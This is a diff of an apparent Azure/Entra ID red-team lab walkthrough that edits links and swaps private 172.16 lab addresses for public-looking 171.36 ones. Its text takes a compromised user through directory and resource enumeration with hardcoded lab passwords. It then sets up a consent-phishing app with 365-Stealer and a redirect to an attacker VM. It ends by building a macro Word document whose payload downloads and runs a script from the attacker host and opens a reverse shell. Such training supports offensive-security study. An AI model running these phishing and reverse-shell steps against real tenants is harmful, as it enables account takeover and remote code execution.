@@ -14,9 +14,9 @@
 * * *
 
 TLDR:
-- Use [AzureAD](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module)/[MG Module](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---mg-module) for basic AAD/Entra ID Directory enumeration (i.e., users, groups, devices)
+- Use [AzureAD](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module)/[MG Module](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---mg-module) for basic AAD/Entra ID Directory enumeration (i.e., users, groups, devices)
   - This will require an access token for AAD or MS Graph
-- Use [az powershell](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration----az-powershell) or [az cli](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azure-cli-az-cli) for other enumeration - resources, roles, vms, apps etc
+- Use [az powershell](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration----az-powershell) or [az cli](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azure-cli-az-cli) for other enumeration - resources, roles, vms, apps etc
   - This will require ARM access token (default token)
   - What we REALLY WANT is a **Managed Identity Access Token**
     
@@ -27,10 +27,10 @@ TLDR:
 * * *
 
 #### AzureAD
-Using the [AzureAD Module](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azuread-module) to begin
+Using the [AzureAD Module](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module) to begin
 
 
-We have compromised a user "Test", so first thing after [logging in](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azuread-module); lets see what **user permissions** we have - in Azure this will be groups and roles:
+We have compromised a user "Test", so first thing after [logging in](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azuread-module); lets see what **user permissions** we have - in Azure this will be groups and roles:
 ```
 Get-AzureADUser -SearchString 'test'
 Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
@@ -53,7 +53,7 @@ _in normal environments we would expect to see some Service Principals (that is 
 - OK now lets see if there are any **custom roles**? ```Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False}``` (May need to use preview module)
 - And lets see the **users who have Global admin** role: ```Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember```
 #### MG Module
-You could also use the [MG Module](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---mg-module) instead if you wanted:
+You could also use the [MG Module](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---mg-module) instead if you wanted:
 ```
 $passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force 
 $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
@@ -79,7 +79,7 @@ list all custom directory roles:
 ```Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName```
 
 #### az powershell
-there is also [az Powershell](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration----az-powershell), best for resources, roles and VMs:
+there is also [az Powershell](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration----az-powershell), best for resources, roles and VMs:
 
 - Ok now lets enumerate all **resources** visible to the current user:
 ```Get-AzResource```
@@ -108,7 +108,7 @@ Get-AzWebApp | select name, HostNames, kind, state, identity
  ```Get-AzKeyVault```
 
 #### az cli
-And finally [az cli](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azure-cli-az-cli); 
+And finally [az cli](https://github.com/conma293/Azure/blob/main/1.3_Enumeration.md#enumeration---azure-cli-az-cli); 
 a good one to use from az cli is the **whoami** equivalent:-
 ```az ad signed-in-user show```
 
@@ -236,7 +236,7 @@ Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Forc
 
 goto ```https://localhost/``` and click readmore - take url from address bar which is a good redirect template:
 ```
-https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=c0e39a5f-266c-4425-b6cf-d55350b868dc&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.152.213%2Flogin%2Fauthorized&response_mode=query&sso_reload=true
+https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=c0e39a5f-266c-4425-b6cf-d55350b868dc&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.152.213%2Flogin%2Fauthorized&response_mode=query&sso_reload=true
 ```
 
 #### find vulnerable website
@@ -254,7 +254,7 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
 - Click Microsoft Entra ID > Manage > App registrations - New registrations
   - Create an app called Student213_App
   - Accounts in Multitenant
-  - Redirect URI (Web) to our attacker VM - https://172.16.151.213/login/authorized
+  - Redirect URI (Web) to our attacker VM - https://171.36.151.213/login/authorized
   - goto certificates and secrets and create a Client Secret - a client secret allows you to access the tenant as an application
   - **SAVE CLIENT SECRET!!!**: 
 ```
@@ -274,7 +274,7 @@ We need to ready the attacker VM for incoming redirects that we are going to phi
   - need to provide the app ID and client secret (from before in the azure portal blade)
   - and:
 ```
-https://172.16.152.213/login/authorized
+https://171.36.152.213/login/authorized
 /
 [blank]
 [blank]
@@ -284,7 +284,7 @@ https://172.16.152.213/login/authorized
 - run 365 stealer
 - this has now provided us with the phishing URL we need for later:
 ```
-https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.151.213%2Flogin%2Fauthorized&response_mode=query
+https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.151.213%2Flogin%2Fauthorized&response_mode=query
 ```
 
 
@@ -336,7 +336,7 @@ From the returned users we have identified an admin - if we can phish an admin w
 ```
 $passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
-$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds 
+$officeVM = New-PSSession -ComputerName 171.36.1.250 -Credential $creds 
 
 Enter-PSSession -Session $officeVM 
 ```
@@ -346,12 +346,12 @@ Enter-PSSession -Session $officeVM
 
 - Now, host the script Out-Word on your student VM by copying it to the C:\xampp\htdocs directory and use the below command in the PSRemoting session to load it on the office VM:
 ```
-iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Out-Word.ps1")
+iex (New-Object Net.Webclient).downloadstring("http://171.36.152.213:82/Out-Word.ps1")
 ```
 
 - create the word doc:
 ```
-Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.152.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444" -OutputFile studentx.doc
+Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://171.36.152.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 171.36.152.213 -Port 4444" -OutputFile studentx.doc
 ```
 
 - copy it back to your machine:
